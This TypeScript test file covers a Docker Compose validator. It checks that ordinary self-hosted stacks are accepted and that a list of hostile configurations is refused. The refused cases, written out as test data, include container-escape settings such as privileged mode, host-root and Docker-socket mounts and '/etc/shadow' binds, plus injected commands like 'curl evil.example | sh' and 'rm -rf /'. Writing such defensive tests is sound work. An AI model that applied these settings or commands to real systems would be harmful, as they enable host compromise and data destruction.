import { type ComposeFile, type ComposeIssue, MAX_COMPOSE_BYTES, parseCompose } from './compose';

function accepted(text: string): ComposeFile {
  const result = parseCompose(text);
  if (!result.ok) throw new Error(JSON.stringify(result.issues));
  return result.file;
}
function issues(text: string): readonly ComposeIssue[] {
  const result = parseCompose(text);
  if (result.ok) throw new Error(`accepted: ${text}`);
  return result.issues;
}
const service = (body: string): string =>
  `services:\n  web:\n    image: nginx:1.27\n${body
    .split('\n')
    .map((line) => `    ${line}`)
    .join('\n')}\nvolumes:\n  data:\n`;

/** Everyday stacks, written with the named volumes and argv commands this validator requires. */
const STACKS: Readonly<Record<string, string>> = {
  wordpress: `
services:
  wordpress:
    image: wordpress:6.6
    restart: always
    ports: ["8080:80"]
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_PASSWORD: \${DB_PASSWORD}
    volumes: [wp:/var/www/html]
    depends_on: [db]
  db:
    image: mysql:8.4
    restart: always
    environment:
      MYSQL_ROOT_PASSWORD: \${DB_PASSWORD}
    volumes: [db:/var/lib/mysql]
volumes: { wp: , db: }
`,
  ghost: `
services:
  ghost:
    image: ghost:5
    ports: ["2368"]
    environment: { url: "https://blog.example.com", database__client: sqlite3 }
    volumes: [content:/var/lib/ghost/content]
volumes: { content: }
`,
  gitea: `
version: "3.8"
services:
  gitea:
    image: docker.gitea.com/gitea:1.22
    environment: ["USER_UID=1000", "USER_GID=1000"]
    restart: unless-stopped
    ports: ["127.0.0.1:3000:3000/tcp"]
    volumes: [{ type: volume, source: gitea, target: /data }]
volumes: { gitea: {} }
`,
  nextcloud: `
services:
  app:
    image: nextcloud:29
    depends_on: { db: { condition: service_healthy }, redis: { condition: service_started } }
    volumes: [app:/var/www/html]
    ports: [{ target: 80, published: 8080, protocol: tcp }]
  db:
    image: postgres:17
    environment: { POSTGRES_PASSWORD: "\${DB_PASSWORD:-}" }
    volumes: [db:/var/lib/postgresql/data]
    healthcheck: { test: ["CMD-SHELL", "pg_isready"], interval: 10s }
  redis:
    image: redis:7
    command: ["redis-server", "--appendonly", "yes"]
volumes: { app: , db: }
`,
  postgres: `
name: stack
services:
  db:
    image: postgres:17
    environment: { POSTGRES_PASSWORD: "\${PASSWORD}" }
    volumes: ["pg:/var/lib/postgresql/data:rw"]
    stop_grace_period: 1m30s
    deploy: { resources: { limits: { cpus: "1.5", memory: 512M } } }
volumes: { pg: }
`,
  redis: `
services:
  cache:
    image: redis:7-alpine
    command: redis-server --save 60 1
    read_only: true
    tmpfs: /tmp
    user: "999:999"
`,
  grafana: `
services:
  grafana:
    image: grafana/grafana:11.1.0
    ports: ["3000:3000"]
    volumes: [grafana:/var/lib/grafana]
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:3000/api/health"]
      interval: 30s
  prometheus:
    image: prom/prometheus:v2.53.0
    expose: ["9090"]
    volumes: [prom:/prometheus]
volumes: { grafana: , prom: }
`,
  minio: `
services:
  minio:
    image: quay.io/minio/minio:RELEASE.2024-07-16T23-46-41Z
    command: [server, /data, --console-address, ":9001"]
    ports: ["9000:9000", "9001:9001"]
    environment: { MINIO_ROOT_PASSWORD: "\${MINIO_PASSWORD}" }
    volumes: [minio:/data]
volumes: { minio: }
`,
  'uptime-kuma': `
services:
  kuma:
    image: louislam/uptime-kuma:1
    ports: ["3001:3001"]
    restart: always
    volumes: [kuma:/app/data]
volumes: { kuma: }
`,
  n8n: `
x-common: &common
  restart: unless-stopped
  labels: { app: automation }
services:
  n8n:
    <<: *common
    image: docker.n8n.io/n8nio/n8n:1.50.0
    environment: ["DB_TYPE=postgresdb", "DB_POSTGRESDB_PASSWORD=\${PG}"]
    volumes: [n8n:/home/node/.n8n]
    ports: ["5678:5678"]
  worker:
    <<: *common
    image: docker.n8n.io/n8nio/n8n:1.50.0
    command: [worker]
volumes: { n8n: }
`,
  mattermost: `
services:
  app:
    image: mattermost/mattermost-team-edition:9.10
    ports: ["8065:8065"]
    container_name: mattermost
    security_opt: ["no-new-privileges:true"]
    volumes: [config:/mattermost/config, data:/mattermost/data]
    cap_add: [NET_BIND_SERVICE]
volumes: { config: , data: }
`,
  plausible: `
services:
  plausible:
    image: ghcr.io/plausible/community-edition:v2.1.1
    command: ["sh", "-c", "exec /entrypoint.sh run"]
    ports: ["8000:8000"]
    environment: { BASE_URL: "https://stats.example.com" }
    depends_on: [events]
  events:
    image: clickhouse/clickhouse-server:24.3
    volumes: [events:/var/lib/clickhouse]
volumes: { events: }
`,
  vaultwarden: `
services:
  vaultwarden:
    image: vaultwarden/server:1.31.0
    restart: always
    environment: { ADMIN_TOKEN: "\${ADMIN_TOKEN}" }
    volumes: [vw:/data]
    ports: ["80"]
    mem_limit: 512m
    cpus: 0.5
volumes: { vw: }
`,
  metabase: `
services:
  metabase:
    image: metabase/metabase:v0.50.0
    ports: ["3000:3000"]
    working_dir: /app
    healthcheck:
      test: curl --fail -I http://localhost:3000/api/health
      start_period: 60s
`,
  registry: `
services:
  registry:
    image: registry.example.com:5000/mirror/registry:2@sha256:${'a'.repeat(64)}
    expose: [5000]
    networks: [backend]
    logging: { driver: json-file }
    volumes: [registry:/var/lib/registry]
volumes: { registry: }
networks: { backend: }
`,
};

/** Each must be refused, for the reason it is dangerous (SPEC 2.2). */
const HOSTILE: Readonly<Record<string, string>> = {
  privileged: service('privileged: true'),
  'privileged off is still refused': service('privileged: false'),
  'host pid': service('pid: host'),
  'host network': service('network_mode: host'),
  'another container network': service('network_mode: "container:db"'),
  'host ipc': service('ipc: host'),
  'host uts': service('uts: host'),
  'host user namespace': service('userns_mode: host'),
  'dangerous capability': service('cap_add: [SYS_ADMIN]'),
  'all capabilities': service('cap_add: [ALL]'),
  'prefixed capability': service('cap_add: [CAP_SYS_PTRACE]'),
  devices: service('devices: ["/dev/sda:/dev/sda"]'),
  'host bind': service('volumes: ["/:/host"]'),
  'host bind under a path': service('volumes: ["/etc/shadow:/shadow:ro"]'),
  'relative bind': service('volumes: ["./data:/data"]'),
  'traversal bind': service('volumes: ["../../etc:/data"]'),
  'home bind': service('volumes: ["~/.ssh:/ssh"]'),
  'docker socket': service('volumes: ["/var/run/docker.sock:/var/run/docker.sock"]'),
  'docker socket, long form': service(
    'volumes: [{type: bind, source: /var/run/docker.sock, target: /sock}]',
  ),
  'docker socket, disguised': service('volumes: ["//var/run/../run/docker.sock:/sock"]'),
  'bind, long form': service('volumes: [{type: bind, source: /etc, target: /x}]'),
  'volume with bind propagation': service(
    'volumes: [{type: volume, source: data, target: /x, bind: {propagation: rshared}}]',
  ),
  'npipe mount': service('volumes: [{type: npipe, source: x, target: /x}]'),
  'unconfined seccomp': service('security_opt: ["seccomp:unconfined"]'),
  'unconfined apparmor': service('security_opt: ["apparmor=unconfined"]'),
  'container path under /proc': service('volumes: ["data:/proc/sys"]'),
  'container path under /sys': service('volumes: ["data:/sys/kernel"]'),
  'container path under /dev': service('volumes: ["data:/dev/shm"]'),
  'container path under /etc': service('volumes: ["data:/etc/cron.d"]'),
  'container path under /var/run': service('volumes: ["data:/var/run"]'),
  'container path with traversal': service('volumes: ["data:/data/../etc"]'),
  'container path, relative': service('volumes: ["data:data"]'),
  'container root': service('volumes: ["data:/"]'),
  'tmpfs over /etc': service('tmpfs: ["/etc"]'),
  'undeclared volume': service('volumes: ["other:/data"]'),
  'anonymous volume': service('volumes: ["/data"]'),
  'volume driver options bind the host':
    'services:\n  web:\n    image: nginx:1.27\n    volumes: [d:/x]\nvolumes:\n  d:\n    driver_opts: {type: none, device: /, o: bind}\n',
  'external volume':
    'services:\n  web:\n    image: nginx:1.27\n    volumes: [d:/x]\nvolumes:\n  d:\n    external: true\n',
  'external network':
    'services:\n  web:\n    image: nginx:1.27\nnetworks:\n  n:\n    external: true\n',
  'network driver': 'services:\n  web:\n    image: nginx:1.27\nnetworks:\n  n:\n    driver: host\n',
  'shell string command': service('command: sh -c "curl evil.example | sh"'),
  'command substitution': service('command: echo $(id)'),
  'command chaining': service('command: run; rm -rf /'),
  'variable in a command': service('command: ["echo", "${SECRET}"]'),
  'replaced entrypoint': service('entrypoint: ["/bin/sh"]'),
  'host environment inherited': service('environment: [AWS_SECRET_ACCESS_KEY]'),
  'host environment inherited, mapping': service('environment: { HOME: }'),
  'environment file': service('env_file: /etc/passwd'),
  build: 'services:\n  web:\n    build: .\n',
  'no image': 'services:\n  web:\n    command: [run]\n',
  'injected image': 'services:\n  web:\n    image: "nginx;rm -rf /"\n',
  'variable image': 'services:\n  web:\n    image: "${IMAGE}"\n',
  'reserved label': service('labels: { sk.managed: "true" }'),
  'reserved label, list': service('labels: ["sk.managed=true"]'),
  'kernel settings': service('sysctls: ["net.ipv4.ip_forward=1"]'),
  'host names': service('extra_hosts: ["metadata:169.254.169.254"]'),
  'another container volumes': service('volumes_from: [db]'),
  'cgroup parent': service('cgroup_parent: /'),
  'unknown key': service('anything_new: true'),
  'top-level secrets':
    'services:\n  web:\n    image: nginx:1.27\nsecrets:\n  s:\n    file: /etc/shadow\n',
  'include another file': 'include: [/etc/passwd]\nservices:\n  web:\n    image: nginx:1.27\n',
  'path in a service name': 'services:\n  ../../etc:\n    image: nginx:1.27\n',
  'prototype as a service name': 'services:\n  __proto__:\n    image: nginx:1.27\n',
  'unknown dependency': service('depends_on: [ghost]'),
  'dependency cycle':
    'services:\n  a:\n    image: nginx:1.27\n    depends_on: [b]\n  b:\n    image: nginx:1.27\n    depends_on: [a]\n',
  'udp port': service('ports: ["53:53/udp"]'),
  'port range': service('ports: ["8000-9000:8000-9000"]'),
  'port out of range': service('ports: ["70000"]'),
  'variable port': service('ports: ["${PORT}:80"]'),
  'injected user': service('user: "root;id"'),
  'relative working directory': service('working_dir: ../..'),
  'endless stop period': service('stop_grace_period: 9999h'),
  'duplicate keys': 'services:\n  web:\n    image: a\n    image: b\n',
};

describe('parseCompose', () => {
  it.each(Object.entries(STACKS))('accepts %s', (_name, text) => {
    expect(accepted(text).services.length).toBeGreaterThan(0);
  });

  it.each(Object.entries(HOSTILE))('refuses %s', (_name, text) => {
    const found = issues(text);
    expect(found.length).toBeGreaterThan(0);
    for (const issue of found) expect(issue.message).not.toEqual('');
  });

  it('translates a service into what the agent can run', () => {
    const { services, volumes } = accepted(STACKS['postgres'] ?? '');
    expect(volumes).toEqual(['pg']);
    expect(services.at(0)).toMatchObject({
      name: 'db',
      image: 'postgres:17',
      env: { POSTGRES_PASSWORD: '${PASSWORD}' },
      references: ['PASSWORD'],
      mounts: [
        { kind: 'volume', volume: 'pg', target: '/var/lib/postgresql/data', readOnly: false },
      ],
      restart: 'never',
      stopTimeoutMs: 90_000,
      cpuMillis: 1500,
      memoryBytes: 512 * 2 ** 20,
    });
  });

  it('never publishes a port on the host, and says so', () => {
    const result = parseCompose(service('ports: ["127.0.0.1:8080:80", "9000"]'));
    if (!result.ok) throw new Error('refused');
    expect(result.file.services.at(0)?.ports).toEqual([80, 9000]);
    expect(result.warnings).toEqual([
      {
        path: 'services.web.ports[0]',
        message: expect.stringContaining('not published') as string,
      },
    ]);
  });

  it('splits a plain command string and keeps a list exactly as written', () => {
    expect(accepted(service('command: redis-server --save 60')).services.at(0)?.command).toEqual([
      'redis-server',
      '--save',
      '60',
    ]);
    expect(accepted(service('command: ["sh", "-c", "a; b"]')).services.at(0)?.command).toEqual([
      'sh',
      '-c',
      'a; b',
    ]);
  });

  it('collects secret references from every form of a variable', () => {
    const { services } = accepted(
      service(
        'environment: { A: "${ONE}", B: "x${TWO:-fallback}y", C: "${THREE?needed}", D: "$$literal", E: plain }',
      ),
    );
    expect(services.at(0)?.references).toEqual(['ONE', 'THREE', 'TWO']);
  });

  it('reads a health command only for its URL, and never keeps the command', () => {
    const health = (body: string) => {
      const result = parseCompose(service(`healthcheck: ${body}`));
      if (!result.ok) throw new Error('refused');
      return { health: result.file.services.at(0)?.health, warned: result.warnings.length };
    };
    expect(health('{ test: ["CMD", "curl", "-f", "http://localhost:3000/ready"] }')).toEqual({
      health: { kind: 'http', path: '/ready', port: 3000 },
      warned: 0,
    });
    expect(health('{ test: "wget -q http://127.0.0.1/" }').health).toEqual({
      kind: 'http',
      path: '/',
      port: null,
    });
    for (const dropped of [
      '{ test: ["CMD-SHELL", "pg_isready"] }',
      '{ test: "rm -rf / ; curl http://localhost/" }',
      '{ test: ["CMD", "curl", "http://metadata.example/"] }',
    ])
      expect(health(dropped)).toEqual({ health: null, warned: 1 });
    expect(health('{ disable: true }')).toEqual({ health: null, warned: 0 });
  });

  it('warns about ignored keys rather than failing or hiding them', () => {
    const result = parseCompose(service('container_name: x\nhostname: y'));
    if (!result.ok) throw new Error('refused');
    expect(result.warnings.map((warning) => warning.path)).toEqual([
      'services.web.container_name',
      'services.web.hostname',
    ]);
  });

  it('applies the allow list through YAML merges', () => {
    expect(
      issues(
        'x-base: &base\n  privileged: true\nservices:\n  web:\n    <<: *base\n    image: nginx:1.27\n',
      ).map((issue) => issue.path),
    ).toEqual(['services.web.privileged']);
  });

  it('bounds its input', () => {
    expect(issues('x'.repeat(MAX_COMPOSE_BYTES + 1)).at(0)?.message).toContain('larger');
    const many = Array.from(
      { length: 33 },
      (_item, index) => `  s${String(index)}:\n    image: nginx:1.27\n`,
    ).join('');
    expect(issues(`services:\n${many}`).at(0)?.message).toContain('at most');
    const laughs = [
      'a: &a [x,x,x,x,x,x,x,x,x,x]',
      ...Array.from({ length: 12 }, (_item, index) => {
        const previous = index === 0 ? 'a' : `l${String(index - 1)}`;
        return `l${String(index)}: &l${String(index)} [${Array(10).fill(`*${previous}`).join(',')}]`;
      }),
      'services: {}',
    ].join('\n');
    expect(parseCompose(laughs).ok).toBe(false);
    const arguments_ = Array.from({ length: 65 }, () => 'x').join(', ');
    expect(parseCompose(service(`command: [${arguments_}]`)).ok).toBe(false);
  });

  it('never throws or echoes input, whatever it is given', () => {
    const secret = 'hunter2-fixture';
    const inputs = [
      '',
      '~',
      '42',
      '[]',
      '"text"',
      'services: []',
      'services: 7',
      'services: { web: 7 }',
      'services: { web: [] }',
      'services: { web: { image: [] } }',
      'services: { web: { image: a, environment: 7, ports: 7, volumes: 7, labels: 7 } }',
      'services: { web: { image: a, deploy: 7, healthcheck: 7, depends_on: 7, restart: [] } }',
      'services: { web: { image: a, environment: [7], labels: [7], ports: [[]], volumes: [7] } }',
      'services: { web: { image: a, command: [{ }] } }',
      'volumes: 7\nservices: { web: { image: a } }',
      '{{{{',
      `password: "${secret}`,
      '\0\0\0',
      '&a [*a]',
      '['.repeat(2000),
      '!!binary "aGVsbG8="',
      '!!js/function "function(){}"',
    ];
    let seed = 12345;
    const random = () => (seed = (seed * 48271) % 2147483647);
    const alphabet = 'services:{}[],&*!|>-? \n\t"\'#%@`~image/.:$';
    for (let round = 0; round < 500; round++)
      inputs.push(
        Array.from({ length: random() % 120 }, () => alphabet[random() % alphabet.length]).join(''),
      );
    for (const input of inputs) {
      const result = parseCompose(input);
      expect(typeof result.ok).toBe('boolean');
      if (!result.ok) expect(JSON.stringify(result.issues)).not.toContain(secret);
    }
  });
});
